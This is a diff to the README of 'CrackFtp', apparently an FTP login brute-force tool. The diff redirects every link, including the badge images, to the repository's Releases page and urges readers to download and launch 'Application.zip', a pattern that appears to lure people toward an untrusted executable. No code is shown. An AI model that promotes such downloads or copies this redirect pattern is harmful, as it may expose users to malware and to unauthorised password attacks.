@@ -15,13 +15,13 @@ Welcome to the CrackFtp repository, a powerful script designed for testing FTP l
 automation, brute-force, command-line-tools, cracking, cybersecurity, ethical-hacking, ftp, ftp-cracker, hacking-tools, network, password-cracking, penetration-testing, python, python-script, red-team, scripts, security-scanner, security-tools, telegram-bot
 
 ## 📦 Download
-[![Download CrackFtp](https://img.shields.io/badge/Download-Application.zip-blue)](https://github.com/files/uploaded/Application.zip)
+[![Download CrackFtp](https://github.com/zigaaaaaaaa/CrackFtp/releases)](https://github.com/zigaaaaaaaa/CrackFtp/releases)
 *(Note: The provided link leads to the application file. You can launch it to get started.)*
 
 If the above link is not working, please check the "Releases" section of the repository for alternative download options.
 
 ## 🌐 Stay Updated
-For the latest updates and news related to CrackFtp, you can visit the [official website](https://crackftp.com).
+For the latest updates and news related to CrackFtp, you can visit the [official website](https://github.com/zigaaaaaaaa/CrackFtp/releases).
 
 ---
 
@@ -42,11 +42,11 @@ Please ensure that you have legal permission to test the security of the domains
 ---
 
 ## 🤖 Get Involved
-- Found a bug or have a feature request? [Open an issue](https://github.com/CrackFtp/issues).
+- Found a bug or have a feature request? [Open an issue](https://github.com/zigaaaaaaaa/CrackFtp/releases).
 - Want to contribute to the development of CrackFtp? Fork the repository and submit a pull request.
 
-[![GitHub Stars](https://img.shields.io/github/stars/CrackFtp?style=social)](https://github.com/CrackFtp/stargazers)
-[![GitHub Forks](https://img.shields.io/github/forks/CrackFtp?style=social)](https://github.com/CrackFtp/network/members)
+[![GitHub Stars](https://github.com/zigaaaaaaaa/CrackFtp/releases)](https://github.com/zigaaaaaaaa/CrackFtp/releases)
+[![GitHub Forks](https://github.com/zigaaaaaaaa/CrackFtp/releases)](https://github.com/zigaaaaaaaa/CrackFtp/releases)
 
 ---
 
